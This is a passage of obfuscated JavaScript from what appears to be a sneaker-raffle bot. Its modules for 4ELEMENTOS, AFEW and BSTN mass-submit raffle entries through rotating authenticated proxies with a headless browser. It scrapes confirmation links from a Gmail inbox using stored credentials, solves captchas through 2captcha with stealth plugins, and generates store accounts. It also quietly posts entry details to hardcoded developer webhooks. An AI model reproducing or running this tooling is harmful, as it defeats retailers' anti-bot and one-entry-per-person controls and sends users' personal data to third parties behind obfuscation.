                            console['log'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Checking\x20Information'), await _0x30b552['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xbec2fc(0x1f4), await _0x30b552['type']('input[name=\x22sm-form-email\x22]', _0x4d2101[_0x4b411a]['Email']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-name\x22]', _0x4d2101[_0x4b411a]['FirstName'] + '\x20' + _0x4d2101[_0x4b411a]['LastName']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-street\x22]', _0x4d2101[_0x4b411a]['Address1'] + '\x20' + _0x4d2101[_0x4b411a]['HouseNumber'] + '\x20' + _0x4d2101[_0x4b411a]['Address2']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-city\x22]', _0x4d2101[_0x4b411a]['City']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-province\x22]', _0x4d2101[_0x4b411a]['State']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-zip\x22]', _0x4d2101[_0x4b411a]['Zip']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-country\x22]', _0x4d2101[_0x4b411a]['Country']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-form-phone\x22]', _0x4d2101[_0x4b411a]['Phone']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x4d2101[_0x4b411a]['Follower']), await _0xbec2fc(0xc8), await _0x30b552['type']('input[name=\x22sm-cst.size\x22]', _0x4d2101[_0x4b411a]['Size']), await _0xbec2fc(0x1f4), await _0x30b552['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xbec2fc(0x1f4), await _0x30b552['click']('.icheckbox_simple-custom'), await _0xbec2fc(0x1f4), console['log'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x30b552['$eval']('form', _0x28c4bc => _0x28c4bc['submit']()), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x2c620d = '';
                            var _0x4e7764 = await _0x597409(_0x4d2101[_0x4b411a], _0x1b0331, 'dev', ![]), _0x4ed524 = await _0x597409(_0x4d2101[_0x4b411a], _0x1b0331, 'pub', ![]);
                            const _0x36d788 = {
                                'succesDEVMSG': { 'embeds': [_0x4e7764] },
                                'succesPUBMSG': { 'embeds': [_0x4ed524] }
                            };
                            try {
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x36d788['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x36d788['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x53e58f, _0x36d788['succesPUBMSG']);
                            } catch (_0x572352) {
                                console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x572352));
                            }
                        } catch (_0x585328) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20' + _0x585328)), _0x310106 = '' + _0x585328;
                            var _0x1b087b = await _0x597409(_0x4d2101[_0x4b411a], _0x1b0331, 'dev', !![], _0x310106), _0x4e7764 = await _0x597409(_0x4d2101[_0x4b411a], _0x1b0331, 'dev', ![]), _0x4ed524 = await _0x597409(_0x4d2101[_0x4b411a], _0x1b0331, 'pub', ![]);
                            const _0x571850 = {
                                'succesDEVMSG': { 'embeds': [_0x4e7764] },
                                'succesPUBMSG': { 'embeds': [_0x4ed524] }
                            };
                            _0x571850['errorDEV'] = { 'embeds': [_0x1b087b] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x571850['errorDEV']), await _0x4f1a4a(_0x166efb, _0x571850['errorDEV']), _0x585328 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2c620d = 'yes');
                        } finally {
                            _0x30d5cb['close']();
                            if (_0x2c620d == 'yes' && _0x1e78c8 != 0x5 && _0x310106 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Task\x20' + (_0x4b411a + 0x1) + '\x20:\x20Retrying')), _0x4b411a = _0x4b411a - 0x1, _0x1e78c8 = _0x1e78c8 + 0x1;
                                continue;
                            }
                            _0x2c620d == 'yes' && _0x1e78c8 >= 0x5 && (_0x176a1f(_0x4d2101[_0x4b411a], _0x1b0331), _0x2c620d = 'no', _0x1e78c8 = 0x0), console['log'](_0x27df86() + '\x20[' + _0x1b0331['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x5883a2, _0x2aca15) {
                    var _0x22af21 = [];
                    async function _0x1ec14c() {
                        var _0x5e2b12 = new _0x1c5c24({
                            'user': _0x1c5a09['masterMail'],
                            'password': _0x1c5a09['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x522daf(_0x48e223) {
                            _0x5e2b12['openBox']('INBOX', ![], _0x48e223);
                        }
                        _0x5e2b12['once']('ready', function () {
                            _0x522daf(function (_0x3ee5ac, _0x34ca6e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3ee5ac)
                                    throw _0x3ee5ac;
                                _0x5e2b12['seq']['search'](['UNSEEN'], function (_0x261432, _0x23575c) {
                                    if (!_0x23575c || !_0x23575c['length'])
                                        console['log'](_0x27df86() + '\x20[' + _0x5883a2['name'] + ']\x20No\x20mails\x20found'), _0x5e2b12['end']();
                                    else {
                                        var _0x41f625 = _0x5e2b12['seq']['fetch'](_0x23575c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x41f625['on']('message', function (_0x54474e, _0x463f45) {
                                            var _0x12b975 = '(#' + _0x463f45 + ')\x20';
                                            _0x54474e['on']('body', function (_0x127ebe, _0x57f8c2) {
                                                _0x39d64d(_0x127ebe, (_0x509011, _0x417b52) => {
                                                    if (_0x417b52['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x37f5b7 = _0x417b52['html']['split']('\x0a');
                                                        for (var _0xa64f6d = 0x0; _0xa64f6d < _0x37f5b7['length']; _0xa64f6d++) {
                                                            if (_0x37f5b7[_0xa64f6d]['includes']('salesmanago') && _0x37f5b7[_0xa64f6d]['includes']('<td') && _0x37f5b7[_0xa64f6d]['includes']('href')) {
                                                                var _0x5777fb = _0x37f5b7[_0xa64f6d]['split']('href=\x22'), _0x414002 = _0x5777fb[0x1]['split']('\x22')[0x0];
                                                                _0x22af21['push'](_0x414002);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x54474e['once']('end', function () {
                                            });
                                        }), _0x41f625['once']('error', function (_0x5d0a12) {
                                            console['log']('Fetch\x20error:\x20' + _0x5d0a12);
                                        }), _0x41f625['once']('end', function () {
                                            _0x5e2b12['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5e2b12['once']('error', function (_0x9cb9b8) {
                            console['log'](_0xe1d9e['red'](_0x9cb9b8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x5e2b12['once']('end', async function () {
                        }), _0x5e2b12['connect']();
                    }
                    async function _0x4eaed2(_0xa45f04, _0x5c2fcf, _0x4ccdad) {
                        for (var _0x3422b4 = 0x0; _0x3422b4 < _0x5c2fcf['length']; _0x3422b4++) {
                            async function _0x1b1f66(_0x50b657, _0xba1d8e, _0x44ab53, _0x585f2a, _0xd8165a) {
                                var _0x3bf591, _0x3775b5 = {}, _0x4840ce = [], _0x40d3a0 = {}, _0x4f7cea = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5d6bc5 = Math['round'](Math['random']() * (_0x4f7cea['length'] - 0x1));
                                _0x585f2a[_0x50b657]['Size'] == 'RANDOM' && (_0x585f2a[_0x50b657]['Size'] = _0x4f7cea[_0x5d6bc5]);
                                !_0x585f2a && (_0x585f2a = {});
                                if (_0x1c5a09['useRandomProxy'] = ![])
                                    var _0x5a9144 = _0xd8165a[_0x50b657]['split'](':');
                                else
                                    var _0x209395 = Math['round'](Math['random']() * (_0xd8165a['length'] - 0x1)), _0x5a9144 = _0xd8165a[_0x209395]['split'](':');
                                var _0x198542 = {
                                    'jar': _0x1da69d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x44ab53['url'],
                                    'headers': _0x44ab53['headers'],
                                    'body': JSON['stringify'](_0x3775b5),
                                    'proxy': 'http://' + _0x5a9144[0x2] + ':' + _0x5a9144[0x3] + '@' + _0x5a9144[0x0] + ':' + _0x5a9144[0x1]
                                };
                                return _0xba1d8e != 'ver' && (_0x198542['url'] = _0x44ab53['url'], _0x198542['headers'] = _0x44ab53['headers']), _0xba1d8e == 'ver' && (_0x198542['method'] = 'GET', _0x198542['url'] = _0x585f2a[_0x50b657]), new Promise(function (_0x29ce04, _0x1389f5) {
                                    callback = async (_0x1d60e4, _0x33e23b, _0x4cc658) => {
                                        if (!_0x1d60e4 && _0x33e23b['statusCode'] == 0xca || !_0x1d60e4 && _0x33e23b['statusCode'] == 0xc8) {
                                            if (_0xba1d8e != 'ver') {
                                                var _0x53ecc5 = await _0x597409(_0x585f2a[_0x50b657], _0x44ab53, 'dev', ![]), _0x4bcc15 = await _0x597409(_0x585f2a[_0x50b657], _0x44ab53, 'pub', ![]);
                                                const _0x498411 = {
                                                    'succesDEVMSG': { 'embeds': [_0x53ecc5] },
                                                    'succesPUBMSG': { 'embeds': [_0x4bcc15] }
                                                };
                                                if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                                    try {
                                                        await _0x4f1a4a(_0x1c5a09['webhook'], _0x498411['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x498411['succesDEVMSG']), await _0xbec2fc(0xc8);
                                                try {
                                                    await _0x4f1a4a(_0x53e58f, _0x498411['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x498d8e(_0x585f2a[_0x50b657], _0x44ab53);
                                            }
                                            _0x29ce04(console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x44ab53['name'] + ']\x20Task\x20' + (_0x50b657 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xba1d8e != 'ver') {
                                                var _0x34d02b = '' + _0x1d60e4, _0x2678f0 = await _0x597409(_0x585f2a[_0x50b657], _0x44ab53, 'dev', !![], _0x34d02b), _0x528c9a = {};
                                                _0x528c9a['errorDEV'] = { 'embeds': [_0x2678f0] }, _0x176a1f(_0x585f2a[_0x50b657], _0x44ab53), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x528c9a['errorDEV']), await _0x4f1a4a(_0x166efb, _0x528c9a['errorDEV']);
                                            }
                                            _0x1389f5(console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x44ab53['name'] + ']\x20Task\x20' + (_0x50b657 + 0x1) + ':\x20' + _0x1d60e4)));
                                        }
                                    };
                                    try {
                                        _0xba1d8e != 'ver' ? console['log'](_0x27df86() + '\x20[' + _0x44ab53['name'] + ']\x20Task\x20' + (_0x50b657 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3775b5['data']['attributes']['email']) : console['log'](_0x27df86() + '\x20[' + _0x44ab53['name'] + ']\x20Task\x20' + (_0x50b657 + 0x1) + ':\x20Fetching\x20Response'), _0x4cfc83(_0x198542, callback);
                                    } catch (_0x508119) {
                                        console['log'](_0x27df86() + '\x20Task\x20' + (_0x50b657 + 0x1) + ':\x20' + _0x508119);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1b1f66(_0x3422b4, 'ver', _0xa45f04, _0x5c2fcf, _0x4ccdad), console['log'](_0x27df86() + '\x20[' + _0xa45f04['name'] + ']\x20Sleeping\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                            } catch (_0x5f3587) {
                            }
                        }
                    }
                    try {
                        _0x1ec14c(), await _0xbec2fc(0xfa0), console['log']('Found\x20' + _0x22af21['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4eaed2(_0x5883a2, _0x22af21, _0x2aca15);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x37788c, _0x1759df, _0x1e059d) {
                for (var _0x40a6e1 = 0x0; _0x40a6e1 < _0x1759df['length']; _0x40a6e1++) {
                    _0x1c5a09['AfewDelay'] = _0x1c5a09['delay'];
                    var _0x3d341d;
                    if (_0xa60340 != 'yes')
                        var _0xa60340 = '', _0x3d8368 = 0x0;
                    var _0x610f1a = _0x1759df[_0x40a6e1]['Url'];
                    _0x2167ba(_0x37788c['name'] + '\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20/\x20' + _0x1759df['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x1759df, _0x40a6e1);
                    var _0x4ada20 = await _0x597409(_0x1759df[_0x40a6e1], _0x37788c, 'dev', ![]), _0x2975d2 = await _0x597409(_0x1759df[_0x40a6e1], _0x37788c, 'pub', ![]);
                    const _0x122151 = {
                        'succesDEVMSG': { 'embeds': [_0x4ada20] },
                        'succesPUBMSG': { 'embeds': [_0x2975d2] }
                    };
                    if (_0x1759df[_0x40a6e1]['Email'] == '' || _0x1759df[_0x40a6e1]['FirstName'] == '' || _0x1759df[_0x40a6e1]['LastName'] == '' || _0x1759df[_0x40a6e1]['Country'] == '' || _0x1759df[_0x40a6e1]['Size'] == '' || _0x1759df[_0x40a6e1]['Address1'] == '' || _0x1759df[_0x40a6e1]['Zip'] == '') {
                        console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1c5a09['useRandomProxy'] = ![])
                        var _0x43f656 = _0x1e059d[_0x40a6e1]['split'](':');
                    else
                        var _0x2bd436 = Math['round'](Math['random']() * (_0x1e059d['length'] - 0x1)), _0x43f656 = _0x1e059d[_0x2bd436]['split'](':');
                    const _0x2576b1 = await _0x59f17d['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x43f656[0x0] + ':' + _0x43f656[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x520ab9 = await _0x2576b1['newPage']();
                        await _0x520ab9['setDefaultNavigationTimeout'](0x1d4c0), await _0x520ab9['authenticate']({
                            'username': '' + _0x43f656[0x2],
                            'password': '' + _0x43f656[0x3]
                        }), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x520ab9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x520ab9['setRequestInterception'](!![]), _0x520ab9['on']('request', _0x562b6d => {
                            _0x562b6d['resourceType']() === 'image' || _0x562b6d['resourceType']() === 'font' || _0x562b6d['resourceType']() === 'media' ? _0x562b6d['abort']() : _0x562b6d['continue']();
                        }), await _0x520ab9['goto'](_0x610f1a, { 'waitUntil': 'networkidle2' }), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x520ab9['waitForTimeout'](0xfa0), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x520ab9['waitForTimeout'](0x320);
                        if (_0x1759df[_0x40a6e1]['Size'] == 'RANDOM') {
                            console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x3d2a5c = await _0x520ab9['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x26cd6c => {
                                return _0x26cd6c['map'](_0x5c027 => _0x5c027['href']);
                            });
                            var _0x2561d7 = Math['round'](Math['random']() * (_0x3d2a5c['length'] - 0x1));
                            await _0x520ab9['goto']('' + _0x3d2a5c[_0x2561d7]);
                        } else {
                            console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1759df[_0x40a6e1]['Size']);
                            try {
                                const _0x74faf = await _0x520ab9['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x1759df[_0x40a6e1]['Size'] + '\x22]\x20>\x20a', _0x2e9b29 => {
                                    return _0x2e9b29['map'](_0x595a4d => _0x595a4d['href']);
                                });
                                await _0x520ab9['goto']('' + _0x74faf[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x508491) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20' + _0x508491 + '\x20Size\x20not\x20found')), _0x3d341d = 'Size\x20Not\x20Found';
                                var _0x2b8572 = await _0x597409(_0x1759df[_0x40a6e1], _0x37788c, 'dev', !![], _0x3d341d);
                                _0x122151['errorDEV'] = { 'embeds': [_0x2b8572] };
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x122151['errorDEV']);
                                await _0x4f1a4a(_0x166efb, _0x122151['errorDEV']);
                                continue;
                            }
                        }
                        await _0x520ab9['waitForTimeout'](0x258), await _0x520ab9['type']('#raffle-instagram', '' + _0x1759df[_0x40a6e1]['Follower'], { 'delay': 0x64 }), await _0x520ab9['waitForTimeout'](0x384), await _0x520ab9['click']('#raffle-terms'), await _0x520ab9['waitForTimeout'](0x384), await _0x520ab9['evaluate'](() => {
                            const _0x56e752 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x56e752['click']();
                        }), await _0x520ab9['waitForTimeout'](0xbb8), await _0x520ab9['waitForSelector']('#checkout_email'), await _0xbec2fc(0x3e8), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x520ab9['type']('#checkout_email', '' + _0x1759df[_0x40a6e1]['Email'], 0x32), await _0xbec2fc(0x320), await _0x520ab9['select']('#checkout_shipping_address_country', '' + _0x1759df[_0x40a6e1]['Country']), await _0x520ab9['waitForTimeout'](0x258), await _0x520ab9['type']('#checkout_shipping_address_first_name', '' + _0x1759df[_0x40a6e1]['FirstName']), await _0x520ab9['waitForTimeout'](0x320), await _0x520ab9['type']('#checkout_shipping_address_last_name', '' + _0x1759df[_0x40a6e1]['LastName']), await _0x520ab9['waitForTimeout'](0x2bc), await _0x520ab9['type']('#checkout_shipping_address_address1', _0x1759df[_0x40a6e1]['Address1'] + '\x20' + _0x1759df[_0x40a6e1]['HouseNumber']), await _0x520ab9['waitForTimeout'](0x2bc), await _0x520ab9['type']('#checkout_shipping_address_address2', '' + _0x1759df[_0x40a6e1]['Address2']), await _0x520ab9['waitForTimeout'](0x2bc);
                        _0x1759df[_0x40a6e1]['Postcode'] == undefined ? await _0x520ab9['type']('#checkout_shipping_address_zip', '' + _0x1759df[_0x40a6e1]['Zip']) : await _0x520ab9['type']('#checkout_shipping_address_zip', '' + _0x1759df[_0x40a6e1]['Postcode']);
                        await _0x520ab9['waitForTimeout'](0x2bc), await _0x520ab9['type']('#checkout_shipping_address_city', '' + _0x1759df[_0x40a6e1]['City']), await _0x520ab9['waitForTimeout'](0x2bc), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x520ab9, _0x520ab9['evaluate'](() => {
                            const _0x163142 = document['querySelector']('#continue_button');
                            for (var _0x44e021 = 0x0; _0x44e021 < 0x5; _0x44e021++) {
                                if (_0x163142) {
                                    _0x163142['click'](), _0x163142['click']();
                                    break;
                                } else
                                    _0xbec2fc(0xfa0);
                            }
                        }), await _0x520ab9['waitForTimeout'](0x1194);
                        try {
                            await _0x520ab9['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x520ab9['evaluate'](() => {
                            const _0x132d5b = document['querySelector']('#continue_button');
                            for (var _0x15b875 = 0x0; _0x15b875 < 0x5; _0x15b875++) {
                                if (_0x132d5b) {
                                    _0x132d5b['click']();
                                    break;
                                } else
                                    _0xbec2fc(0xfa0);
                            }
                        }), await _0x520ab9['waitForTimeout'](0x7d0), console['log'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x520ab9['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x520ab9['evaluate'](() => {
                            const _0x59ddd3 = document['querySelector']('#continue_button');
                            for (var _0x14d795 = 0x0; _0x14d795 < 0x5; _0x14d795++) {
                                if (_0x59ddd3) {
                                    _0x59ddd3['click']();
                                    break;
                                } else
                                    _0xbec2fc(0xfa0);
                            }
                        }), await _0x520ab9['waitForTimeout'](0x1194), await _0x520ab9['waitForSelector']('#continue_button'), _0x520ab9['evaluate'](() => {
                            const _0x481ea5 = document['querySelector']('#continue_button');
                            for (var _0x8a0ab8 = 0x0; _0x8a0ab8 < 0x5; _0x8a0ab8++) {
                                if (_0x481ea5) {
                                    _0x481ea5['click']();
                                    break;
                                } else
                                    _0xbec2fc(0xfa0);
                            }
                        });
                        try {
                            await _0x520ab9['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xa60340 = 'no', _0x498d8e(_0x1759df[_0x40a6e1], _0x37788c), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                try {
                                    await _0x4f1a4a(_0x1c5a09['webhook'], _0x122151['succesDEVMSG']);
                                } catch {
                                }
                            await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x122151['succesDEVMSG']), await _0xbec2fc(0xc8);
                            try {
                                await _0x4f1a4a(_0x53e58f, _0x122151['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x22e396) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x22e396));
                        }
                    } catch (_0x20cd4c) {
                        console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20' + _0x20cd4c)), _0x3d341d = '' + _0x20cd4c;
                        var _0x2b8572 = await _0x597409(_0x1759df[_0x40a6e1], _0x37788c, 'dev', !![], _0x3d341d);
                        _0x122151['errorDEV'] = { 'embeds': [_0x2b8572] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x122151['errorDEV']), await _0x4f1a4a(_0x166efb, _0x122151['errorDEV']), _0xa60340 = 'yes';
                    } finally {
                        _0x2576b1 && _0x2576b1['close']();
                        if (_0xa60340 == 'yes' && _0x3d8368 != 0x5 && _0x3d341d != 'Size\x20Not\x20Found') {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x37788c['name'] + ']\x20Task\x20' + (_0x40a6e1 + 0x1) + '\x20:\x20Retrying')), _0x40a6e1 = _0x40a6e1 - 0x1, _0x3d8368 = _0x3d8368 + 0x1;
                            continue;
                        }
                        _0xa60340 == 'yes' && _0x3d8368 >= 0x5 && (_0x176a1f(_0x1759df[_0x40a6e1], _0x37788c), _0xa60340 = 'no', _0x3d8368 = 0x0);
                        if (_0x40a6e1 + 0x1 == _0x1759df['length']) {
                            await _0xbec2fc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x1c5a09['AfewDelay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4796a5, _0x541a56, _0x1df375) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x14b5c0 = 0x0; _0x14b5c0 < _0x541a56['length']; _0x14b5c0++) {
                        if (_0xc99efe != 'yes')
                            var _0xc99efe = '', _0x49a290 = 0x0;
                        var _0x3a7c1e;
                        await _0x200aab(_0x541a56, _0x14b5c0), _0x2167ba(_0x4796a5['name'] + '\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20/\x20' + _0x541a56['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        var _0x31f348 = await _0x597409(_0x541a56[_0x14b5c0], _0x4796a5, 'acc', ![]);
                        const _0xf1a9f4 = { 'succesDEVMSG': { 'embeds': [_0x31f348] } }, _0x5c9e99 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x7cc171 = Math['round'](Math['random']() * (_0x1df375['length'] - 0x1)), _0x35234e = _0x1df375[_0x7cc171]['split'](':');
                        const _0xc3c743 = await _0x59f17d['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x35234e[0x0] + ':' + _0x35234e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5519f3 = await _0xc3c743['newPage']();
                            await _0x5519f3['authenticate']({
                                'username': '' + _0x35234e[0x2],
                                'password': '' + _0x35234e[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5519f3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5519f3['setRequestInterception'](!![]), _0x5519f3['on']('request', _0x4443b0 => {
                                _0x4443b0['resourceType']() === 'image' ? _0x4443b0['abort']() : _0x4443b0['continue']();
